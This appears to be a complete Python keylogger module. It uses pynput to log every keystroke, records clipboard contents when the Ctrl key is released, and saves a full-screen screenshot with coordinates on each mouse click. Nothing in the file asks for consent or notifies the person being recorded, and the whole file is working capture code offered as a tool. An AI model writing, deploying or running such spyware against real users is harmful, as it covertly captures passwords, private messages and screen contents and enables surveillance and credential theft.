#!/usr/bin/env python

# Author: Muhammad Ahmad
# Email : muhammadahmadkon@gmail.com
# Date : 06 - Oct - 2023
# About: This file records the keystrokes of the user.

# ========== Importing Modules ==========
import os
from pynput import keyboard, mouse
import pyperclip
import pyautogui
from utils.writeLog import writeLog, writeAppLog
import time

# ========== On Press Function ==========
def onPress(key):
    try:
        key =  key.char
    except AttributeError:
        key = str(key)
    finally:
        keyPat = {'Key.space' : ' ', 'Key.enter' : '\n', 'Key.shift' : '', 'Key.shift_r' : '', 'Key.ctrl_l' : '', 'Key.ctrl_r' : '', 'Key.alt' : '', 'Key.alt_r' : '', 'Key.backspace' : 'backspace\n', 'Key.tab' : '', 'Key.caps_lock' : '', 'Key.cmd' : '', 'Key.cmd_r' : '', 'Key.esc' : '', 'Key.f1' : '', 'Key.f2' : '', 'Key.f3' : '', 'Key.f4' : '', 'Key.f5' : '', 'Key.f6' : '', 'Key.f7' : '', 'Key.f8' : '', 'Key.f9' : '', 'Key.f10' : '', 'Key.f11' : '', 'Key.f12' : '', 'Key.print_screen' : '', 'Key.scroll_lock' : '', 'Key.pause' : '', 'Key.insert' : '', 'Key.home' : '', 'Key.page_up' : '', 'Key.delete' : '', 'Key.end' : '', 'Key.page_down' : '', 'Key.right' : '', 'Key.left' : '', 'Key.down' : '', 'Key.up' : '', 'Key.num_lock' : '', 'Key.menu' : ''}

        if key in keyPat:
            key = keyPat[key]
        else:
            key = key

        writeLog(key)
        
# ========= On Paste Function ==========
def onPaste(key):
    try:
        if key == keyboard.Key.ctrl_l:
            clipboard_text = pyperclip.paste()
            writeLog(f'Pasted: {clipboard_text}\n')
    except Exception as e:
        writeAppLog(f'Error while pasting: {e}')

# ========== Function to record clipboard ==========
def recordClipboard():
    with keyboard.Listener(on_release=onPaste) as listener:
        listener.join()

# ========== Function to record keystrokes ==========
def recordKeyStrokes():
    with keyboard.Listener(on_press=onPress) as listener:
        listener.join()

# ========== On click Function ==========
def onClick(x, y, button, pressed):
    try:
        if not os.path.exists('./screenshots'):
            os.makedirs('./screenshots')
        
        if pressed:
            writeLog(f'Clicked at ({x}, {y})\n')
            screenpic = pyautogui.screenshot()
            picName = f'./screenshots/{time.time()}.png'
            screenpic.save(picName)
    except Exception as e:
        writeLog(f'Error while taking screenshot: {e}')

# ========== Function to record mouse clicks ==========
def recordMouseClicks():
    with mouse.Listener(on_click=onClick) as listener:
        listener.join()